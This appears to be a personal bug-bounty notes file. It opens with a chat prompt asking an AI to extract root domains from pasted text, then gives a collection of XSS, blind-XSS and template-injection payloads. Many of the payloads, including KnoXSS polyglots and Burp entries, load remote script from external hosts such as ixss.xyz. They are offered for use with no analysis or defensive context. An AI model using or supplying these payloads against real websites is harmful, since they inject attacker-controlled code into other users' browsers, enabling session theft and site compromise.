```
Hey, I will paste a large amount of text containing URLs, domains, wildcards (e.g. *.example.com), and subdomains (e.g. blog.example.com).

Your task is to:
- Extract only the **root/base domains** (e.g. example.com).
- Ignore subdomains, wildcards, ports, paths, and query strings.
- Remove duplicates — each root domain should appear only once.
- Output the result as a **sorted list inside a single code block**, with one domain per line.
- Do not include any explanation or extra text — only the clean list of domains inside the code block.

Now wait for my input.
```

## General Payload Collection:
```bash
"><img src=x onerror=alert(1)>
```
```bash
-->';"><img src=x onerror=import('//ixss.xyz')>//
```
```bash
-->';"><script src=//ixss.xyz></script><x="
```
```bash
"><img/src/onerror=import('//ixss.xyz')>
```
```bash
$.getScript("//ixss.xyz")
```
```bash
{{_openBlock.constructor('import("//ixss.xyz")')()}}{{constructor.constructor('import("//ixss.xyz")')()}}
```
```bash
javascript:import('//ixss.xyz')
```
```bash
javascript:eval('var a=document.createElement(\'script\');a.src=\'//ixss.xyz\';document.body.appendChild(a)')
```
```bash
';"/><h1>test{{7*7}}
```
```bash
HTML<h1>HTML&gt;h1&lt;Test{{7*7}}[[7*7]]
```

## KnoXSS
>Blind XSS Custom Vector - Short Polyglot (HTML & JS Main Cases)
```
'/*\'/*"/*\"/*</Script><Input/AutoFocus/OnFocus=/**/(import(/https:\\X55.is?1=19473/.source))//>
```
>Blind XSS Custom Vector - Full Polyglot (20+ XSS Cases): Best, for non-restricted inputs.

```
JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\X55.is?1=19473/.source))}//\76-->
```

## Burpsuite Payloads:
```
bxss
```
```
';\"><script src=//ixss.xyz></script><x=\"
```
```
';\"><img src onerror=import('//ixss.xyz')>
```
```
htmli
```
```
\"/><h1>test{{7*7}}[[7*7]]
```
